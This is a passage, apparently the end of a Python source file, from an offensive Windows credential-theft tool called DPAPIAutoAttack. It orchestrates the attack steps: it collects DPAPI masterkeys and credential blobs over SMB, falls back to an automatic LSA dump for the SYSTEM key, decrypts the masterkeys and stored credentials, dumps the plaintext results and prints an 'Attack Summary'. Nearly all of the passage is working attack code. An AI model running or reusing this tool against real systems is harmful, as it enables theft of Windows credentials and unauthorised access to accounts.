            self._collect.summary()
        except Exception as exc:
            handle_error("Collection phase failed", exc)

    def _get_keys(self):
        sk = self._cfg.get("supplied_key", "")
        if sk:
            try:
                clean = sk.strip().lower().lstrip("0x")
                if clean and HEX_RE.match(clean):
                    self._keyext.user_key = safe_unhexlify(clean)
                    if self._keyext.user_key:
                        ok("Using supplied userkey: 0x%s..." % clean[:16])
                        return
                    else:
                        warn("Supplied key could not be decoded")
                else:
                    warn("Invalid supplied key format")
            except Exception as exc:
                handle_error("Cannot decode supplied userkey", exc)
            info("Falling back to auto LSA dump.")
        try:
            self._keyext.dump_lsa()
        except Exception as exc:
            handle_error("LSA dump failed", exc)

    def _decrypt_mks(self):
        if self._keyext.user_key is None:
            warn("No SYSTEM userkey available. Skipping SYSTEM MK decryption.")
            return
        try:
            self._mkdec.decrypt_with_system_key(
                self._collect.raw_masterkeys,
                self._keyext.user_key,
                self._keyext.machine_key,
            )
        except Exception as exc:
            handle_error("Masterkey decryption failed", exc)

    def _user_keys(self):
        try:
            UserKeyEngine(self._collect, self._mkdec).attempt()
        except Exception as exc:
            handle_error("User key decryption failed", exc)

    def _decrypt_creds(self):
        try:
            self._creddec = CredentialDecryptor(self._mkdec.decrypted)
            self._creddec.decrypt_all(self._collect.raw_credentials)
        except Exception as exc:
            handle_error("Credential decryption failed", exc)

    def _results(self):
        try:
            self._creddec.print_results()
            self._creddec.dump_full()
            section("Attack Summary")
            tc = len(self._collect.raw_credentials) if self._collect.raw_credentials else 0
            tm = len(self._collect.raw_masterkeys)  if self._collect.raw_masterkeys  else 0
            dm = len(self._mkdec.decrypted)          if self._mkdec.decrypted         else 0
            dc = len(self._creddec.results)          if self._creddec.results         else 0
            info("Credentials found      : %d" % tc)
            info("Masterkeys found       : %d" % tm)
            info("Masterkeys decrypted   : %d" % dm)
            info("Credentials decrypted  : %d" % dc)
            if dc > 0 and dc == tc:
                ok("All credentials successfully decrypted!")
            elif tc - dc > 0:
                warn("Credentials not decrypted : %d" % (tc - dc))
                warn("Re-run and answer y when asked about user passwords.")
        except Exception as exc:
            handle_error("Results display failed", exc)

    def _cleanup(self):
        try:
            self._smb.disconnect()
        except Exception:
            pass
        cleanup_all()


# =============================================================================
#  Entry point
# =============================================================================

def main():
    try:
        cfg = collect_inputs()
    except (KeyboardInterrupt, EOFError):
        print("\n\n  [!] Aborted.")
        sys.exit(0)
    except SystemExit:
        raise
    except Exception as exc:
        fail("Input collection error: %s" % exc)
        sys.exit(1)

    try:
        setup_logging(cfg.get("debug", False))
    except Exception as exc:
        print("Warning: Could not setup logging: %s" % exc)

    try:
        DPAPIAutoAttack(cfg).run()
    except Exception as exc:
        fail("Attack failed: %s" % exc)
        if DEBUG_MODE:
            tb.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
